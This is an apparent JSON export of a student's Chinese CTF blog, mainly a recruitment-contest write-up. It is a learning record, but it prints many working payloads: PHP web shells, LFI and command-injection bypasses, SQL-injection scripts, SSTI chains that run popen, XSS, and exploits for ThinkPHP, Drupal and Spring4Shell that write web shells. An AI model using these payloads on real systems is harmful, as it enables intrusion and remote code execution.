{"meta":{"title":"Leon's blog😽","subtitle":"写些随笔","description":"想爱想吃想变成天上忽明忽暗的云","author":"Leon","url":"https://foreon.github.io","root":"/"},"pages":[{"title":"关于我","date":"2023-11-02T14:26:00.000Z","updated":"2023-11-02T14:38:28.527Z","comments":true,"path":"about/index.html","permalink":"https://foreon.github.io/about/index.html","excerpt":"","text":"介绍下自己我是UESTC网络空间安全专业的一名本科生，目前在学习ctf。以后会在这个博客更新一些自己的学习经历和总结，可能也会存一些期末复习笔记（ 希望能保持一颗不断学习的心🙏🙏🙏"},{"title":"友链","date":"2023-11-02T13:04:17.000Z","updated":"2023-11-02T13:52:42.568Z","comments":true,"path":"link/index.html","permalink":"https://foreon.github.io/link/index.html","excerpt":"","text":""},{"title":"相册","date":"2023-11-02T13:43:04.000Z","updated":"2023-11-02T14:38:56.014Z","comments":true,"path":"gallery/index.html","permalink":"https://foreon.github.io/gallery/index.html","excerpt":"","text":"施工中。。。"},{"title":"categories","date":"2023-11-02T13:02:49.000Z","updated":"2023-11-02T13:02:49.852Z","comments":true,"path":"categories/index-1.html","permalink":"https://foreon.github.io/categories/index-1.html","excerpt":"","text":""},{"title":"留言板","date":"2023-11-02T13:04:09.000Z","updated":"2023-11-02T14:39:07.233Z","comments":true,"path":"messageboard/index.html","permalink":"https://foreon.github.io/messageboard/index.html","excerpt":"","text":"施工中。。。"},{"title":"分类","date":"2023-11-02T05:06:39.000Z","updated":"2023-11-02T13:17:35.207Z","comments":true,"path":"categories/index.html","permalink":"https://foreon.github.io/categories/index.html","excerpt":"","text":""},{"title":"日志","date":"2023-11-02T13:06:13.000Z","updated":"2023-11-02T13:07:24.429Z","comments":true,"path":"timeline/index.html","permalink":"https://foreon.github.io/timeline/index.html","excerpt":"","text":""},{"title":"Leon","date":"2023-11-02T13:07:38.000Z","updated":"2023-11-02T13:08:01.344Z","comments":true,"path":"myself/index.html","permalink":"https://foreon.github.io/myself/index.html","excerpt":"","text":""},{"title":"音乐","date":"2023-11-02T14:22:10.000Z","updated":"2023-11-02T14:39:24.010Z","comments":true,"path":"music/index.html","permalink":"https://foreon.github.io/music/index.html","excerpt":"","text":"施工中。。。"},{"title":"标签","date":"2023-11-02T05:07:08.000Z","updated":"2023-11-02T12:35:58.799Z","comments":true,"path":"tags/index.html","permalink":"https://foreon.github.io/tags/index.html","excerpt":"","text":""},{"title":"影视","date":"2023-11-02T14:22:29.000Z","updated":"2023-11-02T14:39:16.375Z","comments":true,"path":"movies/index.html","permalink":"https://foreon.github.io/movies/index.html","excerpt":"","text":"施工中。。。"},{"title":"tags","date":"2023-11-02T12:35:20.000Z","updated":"2023-11-02T12:35:20.326Z","comments":true,"path":"tags/index-1.html","permalink":"https://foreon.github.io/tags/index-1.html","excerpt":"","text":""}],"posts":[{"title":"YuLin 2023 Recruit Writeup","slug":"YuLin 2023 Recruit Writeup","date":"2023-11-03T15:56:39.000Z","updated":"2023-11-03T16:15:39.789Z","comments":true,"path":"posts/36124.html","link":"","permalink":"https://foreon.github.io/posts/36124.html","excerpt":"","text":"YuLin 2023 Recruit Writeup前言（叠个甲先part1是用word写的，直接黏贴过来量太多就不修改了😭，part2 是用md，可能看起来舒服一点。如果读者看得比较难受，这非常正常，请原谅我的懒惰🙇part1:Tutorial1.http这里要注意，admin是改cookie里的admin&#x3D;1! 2.302跳转 查看源代码找到&#x2F;302.php Curl -i 找到flag 3.encode 关于decode可以看看这个链接 https://www.cnblogs.com/ruoli-s/p/14206145.html 判断第一个是md5 解密得到Yulin 判断第二个是hex编码 解码得到Sec{we_mu5t_kn0w 第三个是base64 解码得到_c0mm0n 判断第四个是html实体编码 解码得到_enc0d1ngs} 组合一下得到flag YulinSec{we_mu5t_kn0w_c0mm0n _enc0d1ngs} 4.Method 被提示有很多httpmethod 拿postman一个个试就试出来了 5.cal-1 源代码进去改下长度就完事 6.cal-2 发现要用post的方法传数据，就完事了 7.cal-3 用python脚本做 我还学了好一会，感觉python脚本是个大问题 import requestss&#x3D;requests.Session()url&#x3D;’http://43.142.109.233:44504/index.php‘r&#x3D;s.get(url) res&#x3D;r.text a&#x3D;res.find(““)b&#x3D;res.find(“&#x2F;p&gt;”,a)#找到我们要计算的式子的前后位置num&#x3D;res[a+3:b-1]print(a)print(b)print(num)r&#x3D;s.post(url,data&#x3D;{‘result’:eval(num)})print(r.content) 8.https 前言: 经大佬提醒,了解了不少jwt知识 了解到两种主要思路 1.弱口令把key爆出来 2.使用none的方式 由于安装不清楚第一次所需的工具😅，所以采用第二种方法 原理如下所示 本题抓包发现token,于是采用jwt绕过 1.将头部信息的alg值改为none，并进行base64加密 2.将声明部分的admin值改为true，也进行base64加密 3.新组合的JWT应该为头部``.``声明``.(因为头部中的加密方式为none，所以签名部分可以舍去)，但又由于&#x3D;号会与url解码产生歧义，所以需要将&#x3D;号删除，而Base64URL是支持这种写法的 最终的JWT值为ewogICJhbGciOiAibm9uZSIsCiAgInR5cCI6ICJKV1QiCn0.ewogICJhZG1pbiI6ICIxIiwKICAiaWF0IjogMTY5NDk0OTM0NSwKICAiZXhwIjogMTY5NDk1NjU0NSwKICAianRpIjogIjM0YTczNGEzODAzZGY1NmZlYmIzOTg3MzJlOWQwZDE5Igp9. 4.把token放到cookie里得到flag LFI 依照提示传参即可 不知道为啥hackbar的post这类题用不了？ 那就用postman来post 使用file&#x3D;php:&#x2F;&#x2F;input + post 再file&#x3D;php:&#x2F;&#x2F;input + post 得到flag 使用data:&#x2F;&#x2F;text&#x2F;plain;base64,xxxx(base64编码后的数据)data:&#x2F;&#x2F;text&#x2F;plain, data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4&#x3D; data:&#x2F;&#x2F;text&#x2F;plain, data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4&#x3D; 得到flag 看到提示，直接想到用base64编码转出 file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php 得到一串base64编码，转码之后即得到flag 看教程绕过file_get_contents($file) 了但是还对原理一知半解 采用第一种方式就拿到flag了 文档里说的很清楚了，话说我自己试的一句话木马就不太好使，还得是图片里的这个好使，然后就生成一句话木马图片呗，然后蚁剑 &lt;?phpfputs(fopen(“shell.php”,&#39;w&#39;),&#39;&lt;?php @eval($_POST[”leon“])；?&gt; &#39;); ?&gt; 要注意的是蚁剑访问的目录是生成的shell.php 即为http://43.142.109.233:21005/shell.php 这题花了我大概一天的时间钻研，最终做出来了 参考：LFI 绕过 Session 包含限制 Getshell_通过sessid进行文件写即可,使用 file:&#x2F;&#x2F;localhost&#x2F; 进行绕过_zhang三的博客-CSDN博客 先了解session知识吧 Phpinfo先找到session的储存路径 Session自定义一个 然后传一个一句话木马 发现可以控制了 于是果断蚁剑解出 补一个大佬的做法： 思路更清晰一些 XSS 看看这这篇攻略XSS挑战赛解题思路_多崎巡礼的博客-CSDN博客 看源代码发现有个hidden的 name 普普通通构造个playload就完事了 name=&lt;script&gt;alert(1)&lt;/script&gt; 这里我本来想用闭合标签来完成 但是发现&lt;被转义了，只能利用 &#39;onmouseover=alert(1)//，不过这里需要用单引号闭合，构造playload 和上题一样，只不过把单引号换成双引号来闭合罢了 第四题发现会把on转成o_n 而且会给 中间的东西加双引号 于是上网查攻略,知道要用伪协议 &quot;&gt;&lt;iframe src=javascript:alert(1)&gt; &quot;&gt;&lt;a href=javascript:alert(1)&gt; &quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;zhouzhong&lt;/a&gt; &quot;&gt;&lt;a href=&quot;javascript:%61lert(1)&quot;&gt;zhouzhong&lt;/a&gt; // 就做出来了 5. 试了试”&gt;1&lt;script&gt;alert(1)&lt;/script&gt; // 可能是屏蔽了script,于是思路是双写绕过 &quot;&gt;&lt;scriscriptpt&gt;alert(0)&lt;/scriscriptpt&gt;//这些双写也可以 就拿到flag了 用伪协议发现过滤了javascript，于是查攻略吧 javascrip&amp;#x74;:alert(1) javasc&amp;#x72;ipt:alert1 javasc&amp;#x0072;ipt:alert1 第一次见这种，猜测t_sort那里是隐藏的搜索框 于是看攻略吧 这里只要构造如下playload就行 t_sort=”type=’’text”onclick = ”alert(1) 复现了一下发现这个双引号”不能用 得用下面的双引号 “ 未解之谜，先放这吧 t_sort=&quot;type=&quot;text&quot;onclick = &quot;alert(1) XSS看攻略愉快的ak了 话说真的不是按这个攻略出题的吗( RCE 在当前目录下没找，于是 ls &#x2F; ping127.0.0.1;ls &#x2F; # 找到flag ping127.0.0.1;cat &#x2F;flag_3124131231 # ping127.0.0.1;ls # 有waf 试了一下过滤了;|&amp;’&#96;等等 于是用%0a``绕过 ip=127.0.0.1%0als / 再ip&#x3D;127.0.0.1%0acat&#x2F;flag_31241421414 得到flag 试了一下过滤了ls 文件上传 采用了一种新的方式 传一句话木马文件蚁剑后门报错捏 于是火狐禁止js，传一个.php文件上去 路径是复制的图像链接 然后蚁剑后门 考察.htaccess文件 用记事本写这样一个名为.htaccess的文件 注意保存为所有类型 &lt;FilesMatch“.png”&gt; SetHandler application&#x2F;x-httpd-php 该文件的意思是，只要遇到文件名中包含有”.png”字符 串的，统一按照 php 文件来执行。然后就可以上传一个带一句话木马的文件，例如a_php.gif，会 被当成php执行。该方法其实不是漏洞，是Apache的特性。该方法常用于黑客入侵网站之后，不想 被发现，留一个隐蔽的后门。 然后先上传.htaccess文件,再上次木马.png 然后蚁剑就完事了 上传php文件抓包，修改文件类型为image&#x2F;png 然后就可以上传了，于是愉快的蚁剑 考察文件头绕过 用winhex 但是这样修改后用蚁剑连接 http://43.142.109.233:30004/upload/muma.png 还是报错，于是再次采用上传php用burp改png的方法 其实也可以换一种生成shell.php的png图片木马 下次再试 然后蚁剑吧 很明显要绕过黑名单这些 但是明显黑名单太少了，这里先用大写绕过罢 然而大写绕过并不可行？ 再次尝试双写绕过，成了，于是蚁剑 再次尝试双写 发现不行，添加了一个空格 这次大写绕过又行了？ 那就蚁剑吧 提示%00截断 原理如下 照猫画虎就出来了 考察16进制00截断 Burp上传图片木马抓包 在路径后面加一个1.php+,再在hex里找到+对应的编码，并改成00,就跟上题一样了 提示白名单，但是试一下又觉得是黑名单？ 双写大写绕过都没用，那试试别的吧 莫名奇妙做出来了？ 改成这样 注意蚁剑连接phtml还是小心(为什么 这题要再做一遍 为什么这里多了个空格，怎么复现？ 再做了一次为什么又没空格了，而且这里路径为什么不需要大写？ 11.二次渲染 合成一个gif木马文件，注意文件头要对 还是不行？那还是找一张真正的gif合成吧 现在行了 下载gif，比对没有改变的地方 然后在不改变的地方插入一句话木马 蚁剑连图片链接老报错 去学了一下 其实用一个文件包含漏洞就能用蚁剑连接 要利用include.php?file&#x3D;upload&#x2F; 然后就可以用蚁剑连接了 网页也是可以访问的 提示是利用move_uploaded_file($temp_file,$img_path)的漏洞，这个函数它有一个特性，会忽略到文件末尾的&#x2F;. 这样上传，然后burp抓包 把名字改成muma.php&#x2F;. 蚁剑连接 &#x2F;upload&#x2F;muma.php发现可以访问了 顺藤摸瓜找到了原帖（搜索能力也是能力！ 直接看原帖吧，哥们代码审计还看不明白 Sql注入 1.普通注入 普普通通的整形闭合 如图所示做完 提示是报错注入 试了一下是整形闭合捏 以下黏贴之后的代码有问题 爆数据库 http://43.142.109.233:20002/?id=-1 and updatexml(1,concat(‘~’, substr( (select group_concat(schema_name) from information_schema.schemata) , 1 , 31) ),3)– a 爆表名 http://43.142.109.233:20002/?id=-1 and updatexml(1,concat(‘~’, substr( (select group_concat(table_name) from information_schema.tables wheretable_schema&#x3D;database()) , 8 , 31) ),3)– a 注意这里要取后面的字符才完整 爆列名 http://43.142.109.233:20002/?id=-1 and updatexml(1,concat(‘~’, substr( (select group_concat(column_name) from information_schema.columns wheretable_name&#x3D;’flag’) , 1 , 31) ),3)– a 爆flag http://43.142.109.233:20002/?id=-1 and updatexml(1,concat(‘~’, substr( (select group_concat(flag) from flag) , 10 , 31) ),3)– a 注意flag太长显示不完全，分段来看吧 布尔盲注 一些基础知识 操作 开搞 试了一下发现是整形形闭合 http://43.142.109.233:20003/?id=1and length(database())&#x3D;8 尝试到8发现回显ok,说明数据库名为8 一个个把数据名试出来 推荐二分查找法 http://43.142.109.233:20003/?id=1and ASCII(SUBSTR(database(),2,1)) &#x3D; 101 ok查出来是security 发现搞不定啊,这工程量。。。还得上脚本 import requests 只需要修改url 和 两个payload即可目标网址（不带参数）url &#x3D; “http://43.142.109.233:20003/“ 猜解长度使用的payloadpayload_len &#x3D; “””?id&#x3D;1 and length( (database()) ) &lt; {n} “”” 枚举字符使用的payloadpayload_str &#x3D; “””?id&#x3D;1 and ascii( substr( (database()) ,{n},1) ) &#x3D; {r} “”” 获取长度def getLength(url, payload): length &#x3D; 1 # 初始测试长度为1 while True: response &#x3D; requests.get(url&#x3D; url+payload_len.format(n&#x3D; length)) # 页面中出现此内容则表示成功 if ‘OK’ in response.text: print(‘测试长度完成，长度为：’, length,) return length; else: print(‘正在测试长度：’,length) length +&#x3D; 1 # 测试长度递增 获取字符def getStr(url, payload, length): str &#x3D; ‘’ # 初始表名&#x2F;库名为空 # 第一层循环，截取每一个字符 for l in range(1, length+1): # 第二层循环，枚举截取字符的每一种可能性 for n in range(33, 126): response &#x3D; requests.get(url&#x3D; url+payload_str.format(n&#x3D; l, r&#x3D; n)) # 页面中出现此内容则表示成功 if ‘OK’ in response.text: str+&#x3D; chr(n) print(‘第’, l, ‘个字符猜解成功：’, str) break; return str; 开始猜解length &#x3D; getLength(url, payload_len)getStr(url, payload_str, length) 每次要改的地方只有标红的区域 database() 爆出来表名为security 这里先手动对当前数据库爆表的数量，很方便 http://43.142.109.233:20003/?id=1and (select COUNT(*) from information_schema.tables wheretable_schema&#x3D;database())&#x3D;5 爆出来是5 selecttable_name from information_schema.tables where table_schema &#x3D; database() limit0,1 selecttable_name from information_schema.tables where table_schema &#x3D; database() limit0,1 第一个表 referers selecttable_name from information_schema.tables where table_schema &#x3D; database() limit 1,1 selecttable_name from information_schema.tables where table_schema &#x3D; database() limit 1,1 只改limit后面的数就完事 第二个表 emails 以此推类 第三个表users 第四个表flag 第五个表 就不查了 4.手动爆一些users的列数量 http://43.142.109.233:20003/?id=1and (select COUNT(*) from information_schema.columns wheretable_schema&#x3D;database() and table_name&#x3D;”users”)&#x3D;3 爆出来是3 注意这里要用双引号，我也不知道为啥。。 selectcolumn_name from information_schema.columns where table_schema &#x3D; database() andtable_name &#x3D;”users” limit 0,1 selectcolumn_name from information_schema.columns where table_schema &#x3D; database() andtable_name&#x3D;”users” limit 0,1 selectcolumn_name from information_schema.columns where table_schema &#x3D; database() andtable_name&#x3D;”users” limit 0,1 测出uers第一列:id 测出uers第三列: 测出uers第三列:password 不测了，才发现前面搞错了 flag已经整出来了 那就重复这些步骤找flag的列 测出flag第二列flag selectflag from flag limit 0,1 终于爆出来了 可能是我脚本的问题，速度是龟速，靠脚本还是花了好久时间，不过只是为了解出题那瞬间的多巴胺分泌带来的快感，也是值得的 找朋友要了个更快的自动化脚本 还是整形闭合 在朋友脚本的基础上改了一下做出来了 不过精确度不高 延时盲注的一些语句： “1and if((select count(table_name) frominformation_schema.tables where table_schema &#x3D; ‘database()’) &#x3D; 1,sleep(2),1) 主要是运用if三元式和sleep的原理 YulinSec{0kfjtXaE8VJxXFG9BjZSy0Yn6dVLLMwbQ3OiaI20} 还不会 Babyurl 考察ssrf urls&#x3D;http://0x7F.0.0.1/flag.php SSTI 1. 1.&#123;&#123;''.__class__&#125;&#125; # 获得单引号的类型 2.&#123;&#123;''.__class__.__base__&#125;&#125; #获得object 3.&#123;&#123;''.__class__.__base__.__subclasses__()&#125;&#125;#获得基类 这里要写个脚本得到os._wrap_close的键值 4.&#123;&#123;''.__class__.__base__.__subclasses__()[127]&#125;&#125;#这里我们利用的是&lt;class&#39;os._wrap_close&#39;&gt;类 5.&#123;&#123;''.__class__.__base__.__subclasses__()[127].__init__.__globals__&#125;&#125;#将该类实例化并且全局搜索查找所有的方法、变量和参数 6.&#123;&#123;''.__class__.__base__.__subclasses__()[127].__init__.__globals__['popen']('ls').read()&#125;&#125;#利用popen函数执行命令 7.&#123;&#123;''.__class__.__base__.__subclasses__()[127].__init__.__globals__['popen']('cat flag').read()&#125;&#125;#最后获得flag 不是直接cat，但差不多吧 2. 过滤&#123;&#123;` `用&#123;%print(来代替` `比如` `&#123;%print(''.__class__)%&#125;` `然后按第一题思路就行` `&#123;%print(''.__class__.__base__.__subclasses__()[127]) .__init__.__globals__['popen']('cat /flag').read()%&#125;` `3.` `过滤[]，用getitem` `&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(127).__init__.__globals__.__getitem__('popen')('ls').read()&#125;&#125; &#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(127).__init__.__globals__.__getitem__('popen')('cat` `/flag').read()&#125;&#125; 4. 过滤下划线 用16进制编码绕过 &#123;&#123;()['\\x5f\\x5fclass\\x5f\\x5f']['\\x5f\\x5fbase\\x5f\\x5f']['\\x5f\\x5fsubclasses\\x5f\\x5f']()[127]['\\x5f\\x5finit\\x5f\\x5f']['\\x5f\\x5fglobals\\x5f\\x5f']['popen']('cat` `/flag').read() &#125;&#125; 5. 过滤单双引号 &#123;&#123;[].__class__.__mro__[1].__subclasses__()[127].__init__.__globals__[request.args.a](request.args.b).read()&#125;&#125; 同时get传参?a=popen&amp;b=cat /flag 6． 过滤小数点 &#123;&#123;()['__class__']['__base__']['__subclasses__']()[127]['__init__']['__globals__']['popen']('cat` `/flag')['read']()&#125;&#125; 7. 过滤了一堆关键字 &#123;&#123;()['__cla'+'ss__']['__ba'+'se__']['__subcl'+'asses__']()[127]['__in'+'it__']['__glo'+'bals__']['pop'+'en']('c'+'at` `/fl'+'ag')['re'+'ad']()&#125;&#125; # part2:YuLin 2023 Recruit Writeup part 2word太难用了，于是part2都用md来写 [Easy]盒武器picture1识图出来：武汉理工大学南湖校区心至楼 picture2在地图附件找武汉长江大桥的公园 试出来：湖北省武汉市汉阳区龟山北路5号龟山风景区 看出题人空间找到10.4到10.5的武汉游玩信息 穷举试出来：2023年10月05日18时 babyphp12345678910111213141516&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);if (isset($_GET[&#x27;a&#x27;]) &amp;&amp; isset($_GET[&#x27;b&#x27;])) &#123; if(($_GET[&#x27;a&#x27;] != $_GET[&#x27;b&#x27;]) &amp;&amp; (sha1($_GET[&#x27;a&#x27;]) == sha1($_GET[&#x27;b&#x27;])))&#123; die(&#x27;flag1: &#x27;.$flag1); &#125; else die(&#x27;a is not equal to b&#x27;);&#125;if ((string)$_GET[&#x27;Yu&#x27;] !== (string)$_GET[&#x27;lin&#x27;] &amp;&amp; (md5($_GET[&#x27;Yu&#x27;]) === md5($_GET[&#x27;lin&#x27;]))) &#123; eval($_GET[&#x27;Yu&#x27;]); //cat /flag2&#125; 第二个flag考察fastcoll，用fastcoll生成两个md5相同的字符串，由于有不可见字符，要url编码之后get传参 注意这里根据题目要求，生成文件要用system(‘cat &#x2F;flag2’);# #用于截断，eval只执行system(‘cat &#x2F;flag2’); 1234567891011121314151617181920212223242526272829303132333435363738&lt;?php function readmyfile($path)&#123; $fh = fopen($path, &quot;rb&quot;); $data = fread($fh, filesize($path)); fclose($fh); return $data;&#125;$a = urlencode(readmyfile(&quot;G:\\php\\app\\php-7.4.5-Win32-vc15-x64\\a_msg1.txt&quot;));$b = urlencode(readmyfile(&quot;G:\\php\\app\\php-7.4.5-Win32-vc15-x64\\a_msg2.txt&quot;));if(md5((string)urldecode($a))===md5((string)urldecode($b)))&#123;echo &quot;a:&quot;;echo PHP_EOL;echo $a;echo PHP_EOL;&#125;if(urldecode($a)!=urldecode($b))&#123;echo &quot;b:&quot;; echo PHP_EOL;echo $b;echo PHP_EOL;echo &quot;a url 编码的MD5:&quot;;echo PHP_EOL;echo md5(urldecode($a));echo PHP_EOL;echo &quot;a url 编码的MD5:&quot;;echo PHP_EOL;echo md5(urldecode($b));echo PHP_EOL;echo &quot;复制a url 的MD5&quot;;echo PHP_EOL;echo md5(&quot;leon%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%1FU%F8%24%DA%25Q%F8j%FE%21%F9u%3D9%88%08%11%BC9s%97%CC%E1%18%C2%80E%B0%1D%0Cw%A1%EB%FE%BD%CC%CE%1A%8C%0B%C8%F7%02%E3%F1%09o%84%A8%E6n%E0%1F%8E%7B%17l%01W%DF%FD%40eu%D9%E6f%12%AA%98Z%7F%9A%C1%2A%D9i%CB%0CE%F2X%18%8A%CD%FE%1C+%29%AF%07J%7C%F1%BD%8D_%7Bd%D4%DA%B0%87%22%1D%05%D2%99L%05%3F%CA%84%10%B1%B6%D6%C3qr%29%12m%ED%C4%D0%FB&quot;);echo PHP_EOL;echo &quot;复制b url 的MD5&quot;;echo PHP_EOL;echo md5(&quot;leon%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%1FU%F8%24%DA%25Q%F8j%FE%21%F9u%3D9%88%08%11%BC%B9s%97%CC%E1%18%C2%80E%B0%1D%0Cw%A1%EB%FE%BD%CC%CE%1A%8C%0B%C8%F7%02%E3q%0Ao%84%A8%E6n%E0%1F%8E%7B%17l%01%D7%DF%FD%40eu%D9%E6f%12%AA%98Z%7F%9A%C1%2A%D9i%CB%0CE%F2X%98%8A%CD%FE%1C+%29%AF%07J%7C%F1%BD%8D_%7Bd%D4%DA%B0%87%22%1D%05%D2%99%CC%04%3F%CA%84%10%B1%B6%D6%C3qr%29%12%ED%ED%C4%D0%FB&quot;);$code=&quot;echo 1234 ;#efsdghfgj&quot;;eval(&quot;$code&quot;);&#125; 1http://43.142.109.233:2003/?Yu=system%28%27cat+%2Fflag2%27%29%3B%23%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00f%AB%0F%AE%F7%7C%8DQ8%AA%84%A7Z%06%AD%E8%91F%DE%8DL%D5AUE%B27A%8C%06%89w%3D%BB%AD%CF%F2%28Mp%8F%F0%D5%1C%A0%C9%EAZd%DA%F7%7D%8C%05%ED4%9B%ECXE%88%2F%9F%C5%BA%E8%BAX%2F.%DD%B9%BDJ%B3%7C%96G%3C%3B%A7A%C1x8%9B1%B2%AB%C30%B8%A6_%88%A8%D7%BD%EA%E7%9F%043%FE5%40%0C4Q%F8%F9%C3%B2%EFwp%8AQv%3D%C7aq%BFV%F5%86X&amp;lin=system%28%27cat+%2Fflag2%27%29%3B%23%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00f%AB%0F%AE%F7%7C%8DQ8%AA%84%A7Z%06%AD%E8%91F%DE%0DL%D5AUE%B27A%8C%06%89w%3D%BB%AD%CF%F2%28Mp%8F%F0%D5%1C%A0I%EBZd%DA%F7%7D%8C%05%ED4%9B%ECX%C5%88%2F%9F%C5%BA%E8%BAX%2F.%DD%B9%BDJ%B3%7C%96G%3C%3B%A7A%C1%F88%9B1%B2%AB%C30%B8%A6_%88%A8%D7%BD%EA%E7%9F%043%FE5%40%0C4Qx%F9%C3%B2%EFwp%8AQv%3D%C7aq%3FV%F5%86X [EASY]Script Kiddie既然当脚本小子我就只求结果了（ thinkphp 5.01/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami drupal123456POST /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1Host: 121.5.35.176:30003Content-Type: application/x-www-form-urlencodedContent-Length: 173form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=echo &quot;PD9waHAgZXZhbCgkX1JFUVVFU1RbOF0pIDs/Pg==&quot; |base64 -d |tee test.php 配合使用 1http://121.5.35.176:30003/test.php?8=system(&#x27;cat /flag&#x27;); spring1234567891011121314151617import requestsheaders=&#123; &quot;suffix&quot;: &quot;%&gt;//&quot;, &quot;c1&quot;: &quot;Runtime&quot;, &quot;c2&quot;: &quot;&lt;%&quot;&#125;payload1=&#x27;/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%&#123;c2&#125;i if(&quot;fuck&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123; java.io.InputStream in = %&#123;c1&#125;i.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; &#125; %&#123;suffix&#125;i&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=fuck&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=&#x27;ip=&quot;http://121.5.35.176:30004/&quot;payload2=&#x27;/fuck.jsp?pwd=fuck&amp;cmd=id&#x27;try: U1=requests.get(url=ip+payload1,headers=headers,verify=False,timeout=3) U2=requests.get(url=ip+payload2,verify=False,timeout=3) if U2.status_code == 200: print(f&quot;The VULN CVE-2022-22965 exists, payload 配合 1http://121.5.35.176:30004/fuck.jsp?pwd=fuck&amp;cmd=cat /flag 绝对音感wav拖到010editor里，最后一段发现提示： 1The interval of each byte data is 9 and the first byte is at the beginning of the wav data c写了个脚本跑出来邮件： Dear Friend ; Especially for you - this red-hot announcement! We will comply with all removal requests ! This mailis being sent in compliance with Senate bill 2116 ;Title 1 ; Section 303 ! This is NOT unsolicited bulkmail ! Why work for somebody else when you can becomerich within 81 months . Have you ever noticed nearlyevery commercial on television has a .com on in itand nearly every commercial on television has a .comon in it . Well, now is your chance to capitalize onthis ! We will help you deliver goods right to thecustomer’s doorstep and use credit cards on your website! You can begin at absolutely no cost to you . Butdon’t believe us . Ms Ames who resides in New Jerseytried us and says “Now I’m rich many more things arepossible” ! This offer is 100% legal . So make yourselfrich now by ordering immediately ! Sign up a friendand you get half off . Thanks ! Dear Salaryman ; Especiallyfor you - this amazing intelligence ! If you are notinterested in our publications and wish to be removedfrom our lists, simply do NOT respond and ignore thismail . This mail is being sent in compliance with Senatebill 2716 , Title 3 , Section 303 ! This is differentthan anything else you’ve seen . Why work for somebodyelse when you can become rich within 87 days . Haveyou ever noticed most everyone has a cellphone andsociety seems to be moving faster and faster . Well,now is your chance to capitalize on this ! WE willhelp YOU use credit cards on your website &amp; turn yourbusiness into an E-BUSINESS . You can begin at absolutelyno cost to you ! But don’t believe us ! Mr Ames ofColorado tried us and says “I’ve been poor and I’vebeen rich - rich is better” ! We are licensed to operatein all states . Do not delay - order today ! Sign upa friend and you’ll get a discount of 50% . Thank-youfor your serious consideration of our offer . 然后根据提示可以把垃圾邮件给解密 用这个网站 1https://www.spammimic.com/decode.cgi 【Mid】MidBypass提示说了有disable_function,给了一个后门 蚁剑一下，第一个flag直接送了，其他路径看不了 还有一个open basedir phpinfo先看看 搜了好多关于imagematrick的文件上传漏洞，但是现在还没搞懂写入的png怎么执行命令🥲 蚁剑插件作弊过了，以后有机会要复现一下 pikachu先部署靶场，我直接放在本地127.0.0.1了 解锁皮卡丘的密码暴力破解1.基于表单暴力破解火狐改下设置抓本地包 burp抓包爆破，爆出来密码123456 2. 基于前端的验证码绕过（on server）随便试了下密码怎么还是123456…….. 先burp抓包，然后发现一次抓包中验证码不用改 就和1一样了 3.基于前端的验证码绕过（on client）试了一下验证码是前端的，那么抓包直接去掉，和1一样 密码测出来还是123456 4.token防暴破初见还真没思路，搜索了一下 抓包pitchfork爆破密码和token 如图在extract选中token 如图填入第一个token,并选择递归搜索 成功，密码当然还是12345 XSS1.反射型xss(get)试了一堆球星，只认识科比，有点难绷。 试了下限制长度，f12改掉就行，再输入 1&lt;script&gt;alert(1)&lt;/script&gt; 成功弹窗 2.反射性xss(post)出bug了，我这题出现了登录框 搜索这题本来的样子，然后脑过吧 改成post就是post传参 1&lt;script&gt;alert(1)&lt;/script&gt; 3.存储型xss也是输入 1&lt;script&gt;alert(1)&lt;/script&gt; 4.DOM型xssf12看到提示 function domxss()&#123; var str = document.getElementById(&quot;text&quot;).value; document.getElementById(&quot;dom&quot;).innerHTML = &quot;&lt;a href=&#39;&quot;+str+&quot;&#39;&gt;what do you see?&lt;/a&gt;&quot;; &#125; //试试：&#39;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#39;xss&#39;)&quot;&gt; //试试：&#39; onclick=&quot;alert(&#39;xss&#39;)&quot;&gt;,闭合掉就行 输入 1&#x27; onclick=&quot;alert(&#x27;leon&#x27;)&quot;&gt; 原理就是提前闭合，让href的属性为onclick 5.xss盲打上下两个框都填上 1&lt;script&gt;alert(1)&lt;/script&gt; 然后根据提示登录留言板后台，就弹窗了 6.xss之过滤过滤script,大小写绕过 7.xss之htmlspecialcharsspecialchars函数会把单双引号和尖括号都转义了，但是试了一下这里没过滤单引号 playload: 1&#x27; onclick=&#x27;alert(1) 8.xss之href输出过滤单双引号，用伪协议绕过 1javascript:alert(1) 9.xss之js输出提前闭合第一个script 